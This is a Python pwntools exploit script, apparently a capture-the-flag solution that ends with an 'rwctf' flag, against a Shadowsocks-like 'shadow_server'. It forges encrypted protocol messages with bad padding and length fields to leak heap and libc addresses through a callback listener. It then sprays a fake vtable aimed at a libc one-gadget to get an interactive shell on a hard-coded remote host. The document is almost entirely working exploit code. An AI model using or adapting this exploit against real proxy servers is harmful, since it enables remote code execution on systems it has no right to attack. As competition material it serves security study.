#!/usr/bin/env python2

from pwn import *
import sys
import time
import os
import hashlib
from Crypto.Cipher import AES

local = True
host = '127.0.0.1'
if len(sys.argv) > 1 and sys.argv[1][0] == 'r':
    local = False
    host = '54.153.22.136'
pp = 1
def get_port():
    global pp
    if local:
        #  pp = process('./shadow_server')#, env={'LD_PRELOAD': './libCoroutine.so'})
        pp = remote('127.0.0.1', 31337)
    else:
        pp = remote(host, 3343)
    s = pp.recvuntil('bind at ')
    print(s)
    return int(pp.recvline())

aport = port = get_port()
r = remote(host, port)
context.arch = 'amd64'
password = 'meiyoumima'

def aes_encrypt(data, key, iv):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)

def sha256(ary):
    c = hashlib.sha256()
    for a in ary:
        c.update(a)
    return c.digest()

def aes_token(token, data_ary):
    t = sha256([password, token])
    key = t[0:16]
    iv = t[16:32]
    return aes_encrypt(''.join(data_ary), key, iv)

#  context.log_level = 'debug'
def enc_proto(data, bad_pad = False, bad_length = False):
    data_size = len(data)
    pad_size = 16 - data_size % 16
    random_len = 0
    length = 80 + data_size + pad_size + random_len
    timestamp = int(time.time())
    noise = os.urandom(8)
    token = sha256([password, p64(timestamp), noise])[0:16]
    log.info('token: ' + repr(token))
    main_version = 1
    padding = "\x00" * 10
    for i in range(pad_size):
        if bad_pad:
            data = data + chr(128)
        else:
            data = data + chr(pad_size)
    # random_len == 0
    if bad_length:
        length = 79
    hash_sum = sha256([token, p64(timestamp), noise, p8(main_version), p32(length), p8(random_len), padding, "\x00" * 32, data])
    final = aes_token(token, [p64(timestamp), noise, p8(main_version), p32(length), p8(random_len), padding, hash_sum, data])
    return token + final
r2 = remote(host, aport)
def ip2int(addr):
    return struct.unpack("!I", socket.inet_aton(addr))[0]
ip = '127.0.0.1'
ip = os.environ['IP']
port = 60011
l = listen(port)
r.send(enc_proto('\x01\x01\x01' + p32(ip2int(ip))[::-1] + p16(port)[::-1]))
l.wait_for_connection()
r.send(enc_proto('B' * 1024)) # , bad_pad=True))
for i in range(10):
    r.send(enc_proto(chr(0x65 + i) * 8, bad_pad=True))
r.send(enc_proto('A' * 47, bad_pad=True))
l.recvuntil('h' * 8 + '\x80' * 8)
s = l.recvuntil('AAAAAAAAAA', drop=True)
#  print(repr(s))
heap = u64(s[0:8]) # - 0x16e18
libc = u64(s[24:32]) - 0x3ebca0
log.info('heap @ ' + hex(heap))
log.info('libc @ ' + hex(libc))
#  pause()
port2 = port + 1
l2 = listen(port2)
#  context.log_level = 'debug'
r2.send(enc_proto('\x01\x01\x03' + chr(len(ip)) + ip + p16(port2)[::-1]))
l2.wait_for_connection()
vtable = heap + 0x138
call = heap+0x280
magic = libc + 0xe585f # 0xfaceb00c # heap + 0x1c8
tmp=[remote(host,aport)]
r2.send(enc_proto('A', bad_length=True))
r2.send(
        flat(call, 0x51, magic, 0x51) * 100
        )

time.sleep(1)
r2.send('A')
r2.close()

context.log_level = 'debug'
pp.interactive()
# rwctf{Across_the_Great_Wall_we_can_reach_every_corner_in_the_world_228f6bec172c}
